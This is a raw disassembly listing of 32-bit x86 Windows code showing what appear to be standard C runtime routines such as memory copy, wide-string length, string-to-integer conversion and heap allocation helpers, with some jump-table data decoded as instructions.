  403070:	8c 30                	mov    %?,(%eax)
  403072:	40                   	inc    %eax
  403073:	00 84 30 40 00 7c 30 	add    %al,0x307c0040(%eax,%esi,1)
  40307a:	40                   	inc    %eax
  40307b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  403081:	44                   	inc    %esp
  403082:	8f                   	(bad)
  403083:	e4 8b                	in     $0x8b,%al
  403085:	44                   	inc    %esp
  403086:	8e e8                	mov    %eax,%gs
  403088:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40308c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  403090:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  403094:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  403098:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40309c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  4030a0:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  4030a4:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  4030a8:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  4030ac:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  4030b0:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  4030b4:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4030bb:	03 f0                	add    %eax,%esi
  4030bd:	03 f8                	add    %eax,%edi
  4030bf:	ff 24 95 c8 30 40 00 	jmp    *0x4030c8(,%edx,4)
  4030c6:	8b c0                	mov    %eax,%eax
  4030c8:	d8 30                	fdivs  (%eax)
  4030ca:	40                   	inc    %eax
  4030cb:	00 e0                	add    %ah,%al
  4030cd:	30 40 00             	xor    %al,0x0(%eax)
  4030d0:	ec                   	in     (%dx),%al
  4030d1:	30 40 00             	xor    %al,0x0(%eax)
  4030d4:	00 31                	add    %dh,(%ecx)
  4030d6:	40                   	inc    %eax
  4030d7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4030dd:	c9                   	leave
  4030de:	c3                   	ret
  4030df:	90                   	nop
  4030e0:	8a 06                	mov    (%esi),%al
  4030e2:	88 07                	mov    %al,(%edi)
  4030e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e7:	5e                   	pop    %esi
  4030e8:	5f                   	pop    %edi
  4030e9:	c9                   	leave
  4030ea:	c3                   	ret
  4030eb:	90                   	nop
  4030ec:	8a 06                	mov    (%esi),%al
  4030ee:	88 07                	mov    %al,(%edi)
  4030f0:	8a 46 01             	mov    0x1(%esi),%al
  4030f3:	88 47 01             	mov    %al,0x1(%edi)
  4030f6:	8b 45 08             	mov    0x8(%ebp),%eax
  4030f9:	5e                   	pop    %esi
  4030fa:	5f                   	pop    %edi
  4030fb:	c9                   	leave
  4030fc:	c3                   	ret
  4030fd:	2e 8b c0             	cs mov %eax,%eax
  403100:	8a 06                	mov    (%esi),%al
  403102:	88 07                	mov    %al,(%edi)
  403104:	8a 46 01             	mov    0x1(%esi),%al
  403107:	88 47 01             	mov    %al,0x1(%edi)
  40310a:	8a 46 02             	mov    0x2(%esi),%al
  40310d:	88 47 02             	mov    %al,0x2(%edi)
  403110:	8b 45 08             	mov    0x8(%ebp),%eax
  403113:	5e                   	pop    %esi
  403114:	5f                   	pop    %edi
  403115:	c9                   	leave
  403116:	c3                   	ret
  403117:	90                   	nop
  403118:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40311c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  403120:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403126:	75 24                	jne    0x40314c
  403128:	c1 e9 02             	shr    $0x2,%ecx
  40312b:	83 e2 03             	and    $0x3,%edx
  40312e:	83 f9 08             	cmp    $0x8,%ecx
  403131:	72 0d                	jb     0x403140
  403133:	fd                   	std
  403134:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403136:	fc                   	cld
  403137:	ff 24 95 60 32 40 00 	jmp    *0x403260(,%edx,4)
  40313e:	8b c0                	mov    %eax,%eax
  403140:	f7 d9                	neg    %ecx
  403142:	ff 24 8d 10 32 40 00 	jmp    *0x403210(,%ecx,4)
  403149:	2e 8b c0             	cs mov %eax,%eax
  40314c:	8b c7                	mov    %edi,%eax
  40314e:	ba 03 00 00 00       	mov    $0x3,%edx
  403153:	83 f9 04             	cmp    $0x4,%ecx
  403156:	72 0c                	jb     0x403164
  403158:	83 e0 03             	and    $0x3,%eax
  40315b:	2b c8                	sub    %eax,%ecx
  40315d:	ff 24 85 68 31 40 00 	jmp    *0x403168(,%eax,4)
  403164:	ff 24 8d 60 32 40 00 	jmp    *0x403260(,%ecx,4)
  40316b:	90                   	nop
  40316c:	78 31                	js     0x40319f
  40316e:	40                   	inc    %eax
  40316f:	00 98 31 40 00 c0    	add    %bl,-0x3fffbfcf(%eax)
  403175:	31 40 00             	xor    %eax,0x0(%eax)
  403178:	8a 46 03             	mov    0x3(%esi),%al
  40317b:	23 d1                	and    %ecx,%edx
  40317d:	88 47 03             	mov    %al,0x3(%edi)
  403180:	4e                   	dec    %esi
  403181:	c1 e9 02             	shr    $0x2,%ecx
  403184:	4f                   	dec    %edi
  403185:	83 f9 08             	cmp    $0x8,%ecx
  403188:	72 b6                	jb     0x403140
  40318a:	fd                   	std
  40318b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40318d:	fc                   	cld
  40318e:	ff 24 95 60 32 40 00 	jmp    *0x403260(,%edx,4)
  403195:	2e 8b c0             	cs mov %eax,%eax
  403198:	8a 46 03             	mov    0x3(%esi),%al
  40319b:	23 d1                	and    %ecx,%edx
  40319d:	88 47 03             	mov    %al,0x3(%edi)
  4031a0:	8a 46 02             	mov    0x2(%esi),%al
  4031a3:	c1 e9 02             	shr    $0x2,%ecx
  4031a6:	88 47 02             	mov    %al,0x2(%edi)
  4031a9:	83 ee 02             	sub    $0x2,%esi
  4031ac:	83 ef 02             	sub    $0x2,%edi
  4031af:	83 f9 08             	cmp    $0x8,%ecx
  4031b2:	72 8c                	jb     0x403140
  4031b4:	fd                   	std
  4031b5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4031b7:	fc                   	cld
  4031b8:	ff 24 95 60 32 40 00 	jmp    *0x403260(,%edx,4)
  4031bf:	90                   	nop
  4031c0:	8a 46 03             	mov    0x3(%esi),%al
  4031c3:	23 d1                	and    %ecx,%edx
  4031c5:	88 47 03             	mov    %al,0x3(%edi)
  4031c8:	8a 46 02             	mov    0x2(%esi),%al
  4031cb:	88 47 02             	mov    %al,0x2(%edi)
  4031ce:	8a 46 01             	mov    0x1(%esi),%al
  4031d1:	c1 e9 02             	shr    $0x2,%ecx
  4031d4:	88 47 01             	mov    %al,0x1(%edi)
  4031d7:	83 ee 03             	sub    $0x3,%esi
  4031da:	83 ef 03             	sub    $0x3,%edi
  4031dd:	83 f9 08             	cmp    $0x8,%ecx
  4031e0:	0f 82 5a ff ff ff    	jb     0x403140
  4031e6:	fd                   	std
  4031e7:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4031e9:	fc                   	cld
  4031ea:	ff 24 95 60 32 40 00 	jmp    *0x403260(,%edx,4)
  4031f1:	2e 8b c0             	cs mov %eax,%eax
  4031f4:	14 32                	adc    $0x32,%al
  4031f6:	40                   	inc    %eax
  4031f7:	00 1c 32             	add    %bl,(%edx,%esi,1)
  4031fa:	40                   	inc    %eax
  4031fb:	00 24 32             	add    %ah,(%edx,%esi,1)
  4031fe:	40                   	inc    %eax
  4031ff:	00 2c 32             	add    %ch,(%edx,%esi,1)
  403202:	40                   	inc    %eax
  403203:	00 34 32             	add    %dh,(%edx,%esi,1)
  403206:	40                   	inc    %eax
  403207:	00 3c 32             	add    %bh,(%edx,%esi,1)
  40320a:	40                   	inc    %eax
  40320b:	00 44 32 40          	add    %al,0x40(%edx,%esi,1)
  40320f:	00 57 32             	add    %dl,0x32(%edi)
  403212:	40                   	inc    %eax
  403213:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  403219:	44                   	inc    %esp
  40321a:	8f                   	(bad)
  40321b:	1c 8b                	sbb    $0x8b,%al
  40321d:	44                   	inc    %esp
  40321e:	8e 18                	mov    (%eax),%ds
  403220:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  403224:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  403228:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40322c:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  403230:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  403234:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  403238:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40323c:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  403240:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  403244:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  403248:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40324c:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  403253:	03 f0                	add    %eax,%esi
  403255:	03 f8                	add    %eax,%edi
  403257:	ff 24 95 60 32 40 00 	jmp    *0x403260(,%edx,4)
  40325e:	8b c0                	mov    %eax,%eax
  403260:	70 32                	jo     0x403294
  403262:	40                   	inc    %eax
  403263:	00 78 32             	add    %bh,0x32(%eax)
  403266:	40                   	inc    %eax
  403267:	00 88 32 40 00 9c    	add    %cl,-0x63ffbfce(%eax)
  40326d:	32 40 00             	xor    0x0(%eax),%al
  403270:	8b 45 08             	mov    0x8(%ebp),%eax
  403273:	5e                   	pop    %esi
  403274:	5f                   	pop    %edi
  403275:	c9                   	leave
  403276:	c3                   	ret
  403277:	90                   	nop
  403278:	8a 46 03             	mov    0x3(%esi),%al
  40327b:	88 47 03             	mov    %al,0x3(%edi)
  40327e:	8b 45 08             	mov    0x8(%ebp),%eax
  403281:	5e                   	pop    %esi
  403282:	5f                   	pop    %edi
  403283:	c9                   	leave
  403284:	c3                   	ret
  403285:	2e 8b c0             	cs mov %eax,%eax
  403288:	8a 46 03             	mov    0x3(%esi),%al
  40328b:	88 47 03             	mov    %al,0x3(%edi)
  40328e:	8a 46 02             	mov    0x2(%esi),%al
  403291:	88 47 02             	mov    %al,0x2(%edi)
  403294:	8b 45 08             	mov    0x8(%ebp),%eax
  403297:	5e                   	pop    %esi
  403298:	5f                   	pop    %edi
  403299:	c9                   	leave
  40329a:	c3                   	ret
  40329b:	90                   	nop
  40329c:	8a 46 03             	mov    0x3(%esi),%al
  40329f:	88 47 03             	mov    %al,0x3(%edi)
  4032a2:	8a 46 02             	mov    0x2(%esi),%al
  4032a5:	88 47 02             	mov    %al,0x2(%edi)
  4032a8:	8a 46 01             	mov    0x1(%esi),%al
  4032ab:	88 47 01             	mov    %al,0x1(%edi)
  4032ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4032b1:	5e                   	pop    %esi
  4032b2:	5f                   	pop    %edi
  4032b3:	c9                   	leave
  4032b4:	c3                   	ret
  4032b5:	cc                   	int3
  4032b6:	cc                   	int3
  4032b7:	cc                   	int3
  4032b8:	cc                   	int3
  4032b9:	cc                   	int3
  4032ba:	cc                   	int3
  4032bb:	cc                   	int3
  4032bc:	cc                   	int3
  4032bd:	cc                   	int3
  4032be:	cc                   	int3
  4032bf:	cc                   	int3
  4032c0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4032c4:	66 83 39 00          	cmpw   $0x0,(%ecx)
  4032c8:	8d 41 02             	lea    0x2(%ecx),%eax
  4032cb:	74 0b                	je     0x4032d8
  4032cd:	66 8b 10             	mov    (%eax),%dx
  4032d0:	83 c0 02             	add    $0x2,%eax
  4032d3:	66 85 d2             	test   %dx,%dx
  4032d6:	75 f5                	jne    0x4032cd
  4032d8:	2b c1                	sub    %ecx,%eax
  4032da:	d1 f8                	sar    $1,%eax
  4032dc:	48                   	dec    %eax
  4032dd:	c3                   	ret
  4032de:	90                   	nop
  4032df:	90                   	nop
  4032e0:	a1 04 ef 42 00       	mov    0x42ef04,%eax
  4032e5:	85 c0                	test   %eax,%eax
  4032e7:	75 13                	jne    0x4032fc
  4032e9:	8b 44 24 08          	mov    0x8(%esp),%eax
  4032ed:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4032f1:	50                   	push   %eax
  4032f2:	51                   	push   %ecx
  4032f3:	e8 78 3c 00 00       	call   0x406f70
  4032f8:	83 c4 08             	add    $0x8,%esp
  4032fb:	c3                   	ret
  4032fc:	56                   	push   %esi
  4032fd:	6a 19                	push   $0x19
  4032ff:	e8 cc 30 00 00       	call   0x4063d0
  403304:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403308:	83 c4 04             	add    $0x4,%esp
  40330b:	80 3e 00             	cmpb   $0x0,(%esi)
  40330e:	74 69                	je     0x403379
  403310:	57                   	push   %edi
  403311:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403315:	55                   	push   %ebp
  403316:	53                   	push   %ebx
  403317:	8a 1f                	mov    (%edi),%bl
  403319:	b2 04                	mov    $0x4,%dl
  40331b:	84 db                	test   %bl,%bl
  40331d:	8b c7                	mov    %edi,%eax
  40331f:	74 34                	je     0x403355
  403321:	8a 08                	mov    (%eax),%cl
  403323:	8b e9                	mov    %ecx,%ebp
  403325:	81 e5 ff 00 00 00    	and    $0xff,%ebp
  40332b:	84 95 01 ee 42 00    	test   %dl,0x42ee01(%ebp)
  403331:	74 16                	je     0x403349
  403333:	3a 0e                	cmp    (%esi),%cl
  403335:	75 08                	jne    0x40333f
  403337:	8a 48 01             	mov    0x1(%eax),%cl
  40333a:	3a 4e 01             	cmp    0x1(%esi),%cl
  40333d:	74 16                	je     0x403355
  40333f:	8a 48 01             	mov    0x1(%eax),%cl
  403342:	84 c9                	test   %cl,%cl
  403344:	74 0f                	je     0x403355
  403346:	40                   	inc    %eax
  403347:	eb 04                	jmp    0x40334d
  403349:	3a 0e                	cmp    (%esi),%cl
  40334b:	74 08                	je     0x403355
  40334d:	8a 48 01             	mov    0x1(%eax),%cl
  403350:	40                   	inc    %eax
  403351:	84 c9                	test   %cl,%cl
  403353:	75 cc                	jne    0x403321
  403355:	80 38 00             	cmpb   $0x0,(%eax)
  403358:	75 1c                	jne    0x403376
  40335a:	33 c0                	xor    %eax,%eax
  40335c:	8a 06                	mov    (%esi),%al
  40335e:	84 90 01 ee 42 00    	test   %dl,0x42ee01(%eax)
  403364:	74 08                	je     0x40336e
  403366:	8a 46 01             	mov    0x1(%esi),%al
  403369:	46                   	inc    %esi
  40336a:	84 c0                	test   %al,%al
  40336c:	74 08                	je     0x403376
  40336e:	8a 46 01             	mov    0x1(%esi),%al
  403371:	46                   	inc    %esi
  403372:	84 c0                	test   %al,%al
  403374:	75 a5                	jne    0x40331b
  403376:	5b                   	pop    %ebx
  403377:	5d                   	pop    %ebp
  403378:	5f                   	pop    %edi
  403379:	6a 19                	push   $0x19
  40337b:	e8 d0 30 00 00       	call   0x406450
  403380:	8a 06                	mov    (%esi),%al
  403382:	83 c4 04             	add    $0x4,%esp
  403385:	f6 d8                	neg    %al
  403387:	1b c0                	sbb    %eax,%eax
  403389:	23 c6                	and    %esi,%eax
  40338b:	5e                   	pop    %esi
  40338c:	c3                   	ret
  40338d:	90                   	nop
  40338e:	90                   	nop
  40338f:	90                   	nop
  403390:	53                   	push   %ebx
  403391:	55                   	push   %ebp
  403392:	56                   	push   %esi
  403393:	57                   	push   %edi
  403394:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403398:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  40339f:	7e 11                	jle    0x4033b2
  4033a1:	33 c0                	xor    %eax,%eax
  4033a3:	6a 08                	push   $0x8
  4033a5:	8a 07                	mov    (%edi),%al
  4033a7:	50                   	push   %eax
  4033a8:	e8 83 3e 00 00       	call   0x407230
  4033ad:	83 c4 08             	add    $0x8,%esp
  4033b0:	eb 10                	jmp    0x4033c2
  4033b2:	8b 15 30 be 42 00    	mov    0x42be30,%edx
  4033b8:	33 c9                	xor    %ecx,%ecx
  4033ba:	8a 0f                	mov    (%edi),%cl
  4033bc:	8a 04 4a             	mov    (%edx,%ecx,2),%al
  4033bf:	83 e0 08             	and    $0x8,%eax
  4033c2:	85 c0                	test   %eax,%eax
  4033c4:	74 03                	je     0x4033c9
  4033c6:	47                   	inc    %edi
  4033c7:	eb cf                	jmp    0x403398
  4033c9:	33 c0                	xor    %eax,%eax
  4033cb:	8a 07                	mov    (%edi),%al
  4033cd:	47                   	inc    %edi
  4033ce:	8b f0                	mov    %eax,%esi
  4033d0:	83 fe 2d             	cmp    $0x2d,%esi
  4033d3:	8b ee                	mov    %esi,%ebp
  4033d5:	74 05                	je     0x4033dc
  4033d7:	83 fe 2b             	cmp    $0x2b,%esi
  4033da:	75 07                	jne    0x4033e3
  4033dc:	33 c9                	xor    %ecx,%ecx
  4033de:	8a 0f                	mov    (%edi),%cl
  4033e0:	47                   	inc    %edi
  4033e1:	8b f1                	mov    %ecx,%esi
  4033e3:	33 db                	xor    %ebx,%ebx
  4033e5:	83 3d 3c c0 42 00 01 	cmpl   $0x1,0x42c03c
  4033ec:	7e 0d                	jle    0x4033fb
  4033ee:	6a 04                	push   $0x4
  4033f0:	56                   	push   %esi
  4033f1:	e8 3a 3e 00 00       	call   0x407230
  4033f6:	83 c4 08             	add    $0x8,%esp
  4033f9:	eb 0c                	jmp    0x403407
  4033fb:	8b 15 30 be 42 00    	mov    0x42be30,%edx
  403401:	8a 04 72             	mov    (%edx,%esi,2),%al
  403404:	83 e0 04             	and    $0x4,%eax
  403407:	85 c0                	test   %eax,%eax
  403409:	74 10                	je     0x40341b
  40340b:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  40340e:	33 c9                	xor    %ecx,%ecx
  403410:	8a 0f                	mov    (%edi),%cl
  403412:	47                   	inc    %edi
  403413:	8d 5c 46 d0          	lea    -0x30(%esi,%eax,2),%ebx
  403417:	8b f1                	mov    %ecx,%esi
  403419:	eb ca                	jmp    0x4033e5
  40341b:	83 fd 2d             	cmp    $0x2d,%ebp
  40341e:	8b c3                	mov    %ebx,%eax
  403420:	75 02                	jne    0x403424
  403422:	f7 d8                	neg    %eax
  403424:	5f                   	pop    %edi
  403425:	5e                   	pop    %esi
  403426:	5d                   	pop    %ebp
  403427:	5b                   	pop    %ebx
  403428:	c3                   	ret
  403429:	90                   	nop
  40342a:	90                   	nop
  40342b:	90                   	nop
  40342c:	90                   	nop
  40342d:	90                   	nop
  40342e:	90                   	nop
  40342f:	90                   	nop
  403430:	8b 44 24 04          	mov    0x4(%esp),%eax
  403434:	50                   	push   %eax
  403435:	e8 56 ff ff ff       	call   0x403390
  40343a:	83 c4 04             	add    $0x4,%esp
  40343d:	c3                   	ret
  40343e:	90                   	nop
  40343f:	90                   	nop
  403440:	51                   	push   %ecx
  403441:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403445:	53                   	push   %ebx
  403446:	56                   	push   %esi
  403447:	83 f8 e0             	cmp    $0xffffffe0,%eax
  40344a:	57                   	push   %edi
  40344b:	76 07                	jbe    0x403454
  40344d:	33 c0                	xor    %eax,%eax
  40344f:	5f                   	pop    %edi
  403450:	5e                   	pop    %esi
  403451:	5b                   	pop    %ebx
  403452:	59                   	pop    %ecx
  403453:	c3                   	ret
  403454:	85 c0                	test   %eax,%eax
  403456:	76 08                	jbe    0x403460
  403458:	8d 70 0f             	lea    0xf(%eax),%esi
  40345b:	83 e6 f0             	and    $0xfffffff0,%esi
  40345e:	eb 05                	jmp    0x403465
  403460:	be 10 00 00 00       	mov    $0x10,%esi
  403465:	6a 09                	push   $0x9
  403467:	e8 64 2f 00 00       	call   0x4063d0
  40346c:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403470:	83 c4 04             	add    $0x4,%esp
  403473:	8d 44 24 18          	lea    0x18(%esp),%eax
  403477:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40347b:	50                   	push   %eax
  40347c:	51                   	push   %ecx
  40347d:	57                   	push   %edi
  40347e:	e8 5d 34 00 00       	call   0x4068e0
  403483:	83 c4 0c             	add    $0xc,%esp
  403486:	85 c0                	test   %eax,%eax
  403488:	74 3a                	je     0x4034c4
  40348a:	8b 0d 24 be 42 00    	mov    0x42be24,%ecx
  403490:	33 db                	xor    %ebx,%ebx
  403492:	3b f1                	cmp    %ecx,%esi
  403494:	77 1d                	ja     0x4034b3
  403496:	8b 54 24 18          	mov    0x18(%esp),%edx
  40349a:	c1 ee 04             	shr    $0x4,%esi
  40349d:	56                   	push   %esi
  40349e:	50                   	push   %eax
  40349f:	8b 44 24 14          	mov    0x14(%esp),%eax
  4034a3:	52                   	push   %edx
  4034a4:	50                   	push   %eax
  4034a5:	e8 b6 38 00 00       	call   0x406d60
  4034aa:	83 c4 10             	add    $0x10,%esp
  4034ad:	85 c0                	test   %eax,%eax
  4034af:	74 02                	je     0x4034b3
  4034b1:	8b df                	mov    %edi,%ebx
  4034b3:	6a 09                	push   $0x9
  4034b5:	e8 96 2f 00 00       	call   0x406450
  4034ba:	83 c4 04             	add    $0x4,%esp
  4034bd:	8b c3                	mov    %ebx,%eax
  4034bf:	5f                   	pop    %edi
  4034c0:	5e                   	pop    %esi
  4034c1:	5b                   	pop    %ebx
  4034c2:	59                   	pop    %ecx
  4034c3:	c3                   	ret
  4034c4:	6a 09                	push   $0x9
  4034c6:	e8 85 2f 00 00       	call   0x406450
  4034cb:	8b 0d 8c 02 43 00    	mov    0x43028c,%ecx
  4034d1:	83 c4 04             	add    $0x4,%esp
  4034d4:	56                   	push   %esi
  4034d5:	57                   	push   %edi
  4034d6:	6a 10                	push   $0x10
  4034d8:	51                   	push   %ecx
  4034d9:	ff 15 2c 17 43 00    	call   *0x43172c
  4034df:	5f                   	pop    %edi
  4034e0:	5e                   	pop    %esi
  4034e1:	5b                   	pop    %ebx
  4034e2:	59                   	pop    %ecx
  4034e3:	c3                   	ret
  4034e4:	90                   	nop
  4034e5:	90                   	nop
  4034e6:	90                   	nop
  4034e7:	90                   	nop
  4034e8:	90                   	nop
  4034e9:	90                   	nop
  4034ea:	90                   	nop
  4034eb:	90                   	nop
  4034ec:	90                   	nop
  4034ed:	90                   	nop
  4034ee:	90                   	nop
  4034ef:	90                   	nop
  4034f0:	83 ec 08             	sub    $0x8,%esp
  4034f3:	56                   	push   %esi
  4034f4:	6a 09                	push   $0x9
  4034f6:	e8 d5 2e 00 00       	call   0x4063d0
  4034fb:	8b 74 24 14          	mov    0x14(%esp),%esi
  4034ff:	83 c4 04             	add    $0x4,%esp
  403502:	8d 44 24 04          	lea    0x4(%esp),%eax
  403506:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40350a:	50                   	push   %eax
  40350b:	51                   	push   %ecx
  40350c:	56                   	push   %esi
  40350d:	e8 ce 33 00 00       	call   0x4068e0
  403512:	83 c4 0c             	add    $0xc,%esp
  403515:	85 c0                	test   %eax,%eax
  403517:	74 1a                	je     0x403533
  403519:	33 d2                	xor    %edx,%edx
  40351b:	6a 09                	push   $0x9
  40351d:	8a 10                	mov    (%eax),%dl
  40351f:	8b f2                	mov    %edx,%esi
  403521:	c1 e6 04             	shl    $0x4,%esi
  403524:	e8 27 2f 00 00       	call   0x406450
  403529:	83 c4 04             	add    $0x4,%esp
  40352c:	8b c6                	mov    %esi,%eax
  40352e:	5e                   	pop    %esi
  40352f:	83 c4 08             	add    $0x8,%esp
  403532:	c3                   	ret
  403533:	6a 09                	push   $0x9
  403535:	e8 16 2f 00 00       	call   0x406450
  40353a:	a1 8c 02 43 00       	mov    0x43028c,%eax
  40353f:	83 c4 04             	add    $0x4,%esp
  403542:	56                   	push   %esi
  403543:	6a 00                	push   $0x0
  403545:	50                   	push   %eax
  403546:	ff 15 28 17 43 00    	call   *0x431728
  40354c:	8b f0                	mov    %eax,%esi
  40354e:	5e                   	pop    %esi
  40354f:	83 c4 08             	add    $0x8,%esp
  403552:	c3                   	ret
  403553:	90                   	nop
  403554:	90                   	nop
  403555:	90                   	nop
  403556:	90                   	nop
  403557:	90                   	nop
  403558:	90                   	nop
  403559:	90                   	nop
  40355a:	90                   	nop
  40355b:	90                   	nop
  40355c:	90                   	nop
  40355d:	90                   	nop
  40355e:	90                   	nop
  40355f:	90                   	nop
  403560:	55                   	push   %ebp
  403561:	8b ec                	mov    %esp,%ebp
  403563:	57                   	push   %edi
  403564:	56                   	push   %esi
  403565:	8b 75 0c             	mov    0xc(%ebp),%esi
  403568:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40356b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40356e:	8b c1                	mov    %ecx,%eax
  403570:	8b d1                	mov    %ecx,%edx
  403572:	03 c6                	add    %esi,%eax
  403574:	3b fe                	cmp    %esi,%edi
  403576:	76 08                	jbe    0x403580
  403578:	3b f8                	cmp    %eax,%edi
  40357a:	0f 82 78 01 00 00    	jb     0x4036f8
  403580:	f7 c7 03 00 00 00    	test   $0x3,%edi
  403586:	75 14                	jne    0x40359c
  403588:	c1 e9 02             	shr    $0x2,%ecx
  40358b:	83 e2 03             	and    $0x3,%edx
  40358e:	83 f9 08             	cmp    $0x8,%ecx
  403591:	72 29                	jb     0x4035bc
  403593:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403595:	ff 24 95 a8 36 40 00 	jmp    *0x4036a8(,%edx,4)
  40359c:	8b c7                	mov    %edi,%eax
  40359e:	ba 03 00 00 00       	mov    $0x3,%edx
  4035a3:	83 e9 04             	sub    $0x4,%ecx
  4035a6:	72 0c                	jb     0x4035b4
  4035a8:	83 e0 03             	and    $0x3,%eax
  4035ab:	03 c8                	add    %eax,%ecx
  4035ad:	ff 24 85 c0 35 40 00 	jmp    *0x4035c0(,%eax,4)
  4035b4:	ff 24 8d b8 36 40 00 	jmp    *0x4036b8(,%ecx,4)
  4035bb:	90                   	nop
  4035bc:	ff 24 8d 3c 36 40 00 	jmp    *0x40363c(,%ecx,4)
  4035c3:	90                   	nop
  4035c4:	d0 35 40 00 fc 35    	shlb   $1,0x35fc0040
  4035ca:	40                   	inc    %eax
  4035cb:	00 20                	add    %ah,(%eax)
  4035cd:	36 40                	ss inc %eax
  4035cf:	00 23                	add    %ah,(%ebx)
  4035d1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  4035d7:	46                   	inc    %esi
  4035d8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4035de:	02 c1                	add    %cl,%al
  4035e0:	e9 02 88 47 02       	jmp    0x287bde7
  4035e5:	83 c6 03             	add    $0x3,%esi
  4035e8:	83 c7 03             	add    $0x3,%edi
  4035eb:	83 f9 08             	cmp    $0x8,%ecx
  4035ee:	72 cc                	jb     0x4035bc
  4035f0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4035f2:	ff 24 95 a8 36 40 00 	jmp    *0x4036a8(,%edx,4)
  4035f9:	2e 8b c0             	cs mov %eax,%eax
  4035fc:	23 d1                	and    %ecx,%edx
  4035fe:	8a 06                	mov    (%esi),%al
  403600:	88 07                	mov    %al,(%edi)
  403602:	8a 46 01             	mov    0x1(%esi),%al
  403605:	c1 e9 02             	shr    $0x2,%ecx
  403608:	88 47 01             	mov    %al,0x1(%edi)
  40360b:	83 c6 02             	add    $0x2,%esi
  40360e:	83 c7 02             	add    $0x2,%edi
  403611:	83 f9 08             	cmp    $0x8,%ecx
  403614:	72 a6                	jb     0x4035bc
  403616:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403618:	ff 24 95 a8 36 40 00 	jmp    *0x4036a8(,%edx,4)
  40361f:	90                   	nop
  403620:	23 d1                	and    %ecx,%edx
  403622:	8a 06                	mov    (%esi),%al
  403624:	88 07                	mov    %al,(%edi)
  403626:	46                   	inc    %esi
  403627:	c1 e9 02             	shr    $0x2,%ecx
  40362a:	47                   	inc    %edi
  40362b:	83 f9 08             	cmp    $0x8,%ecx
  40362e:	72 8c                	jb     0x4035bc
  403630:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403632:	ff 24 95 a8 36 40 00 	jmp    *0x4036a8(,%edx,4)
  403639:	2e 8b c0             	cs mov %eax,%eax
  40363c:	9f                   	lahf
  40363d:	36 40                	ss inc %eax
  40363f:	00 8c 36 40 00 84 36 	add    %cl,0x36840040(%esi,%esi,1)
  403646:	40                   	inc    %eax
  403647:	00 7c 36 40          	add    %bh,0x40(%esi,%esi,1)
  40364b:	00 74 36 40          	add    %dh,0x40(%esi,%esi,1)
  40364f:	00 6c 36 40          	add    %ch,0x40(%esi,%esi,1)
  403653:	00 64 36 40          	add    %ah,0x40(%esi,%esi,1)
  403657:	00 5c 36 40          	add    %bl,0x40(%esi,%esi,1)
  40365b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  403661:	44                   	inc    %esp
  403662:	8f                   	(bad)
  403663:	e4 8b                	in     $0x8b,%al
  403665:	44                   	inc    %esp
  403666:	8e e8                	mov    %eax,%gs
  403668:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40366c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  403670:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  403674:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  403678:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
